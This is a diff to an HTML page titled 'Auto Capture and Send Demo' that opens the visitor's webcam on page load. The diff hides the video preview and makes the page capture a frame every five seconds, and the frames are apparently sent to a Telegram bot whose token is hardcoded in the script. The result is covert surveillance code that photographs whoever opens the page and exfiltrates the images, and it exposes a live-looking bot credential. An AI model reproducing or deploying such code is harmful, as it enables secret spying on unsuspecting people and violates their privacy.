@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Capture Demo</title>
+    <title>Auto Capture and Send Demo</title>
 </head>
 <body>
-    <h1>Auto Capture Demo</h1>
-    <video id="video" width="640" height="480" autoplay></video>
+    <h1>Auto Capture and Send Demo</h1>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <script>
         const token = '6881667147:AAG_C3UWpEys2igKflAF-AagpxC4zjy8a-A';
@@ -18,7 +18,7 @@
                 video.srcObject = stream;
 
                 video.addEventListener('loadeddata', () => {
-                    setInterval(captureAndSendImage, 5000); // Ambil gambar setiap 5 detik
+                    captureAndSendImage();
                 });
             } catch (err) {
                 console.error('Error accessing camera:', err);
@@ -52,6 +52,9 @@
                 }
             })
             .catch(error => console.error('Error:', error));
+
+            // Ulangi pengambilan gambar setiap 5 detik
+            setTimeout(captureAndSendImage, 5000);
         }
 
         startCamera();
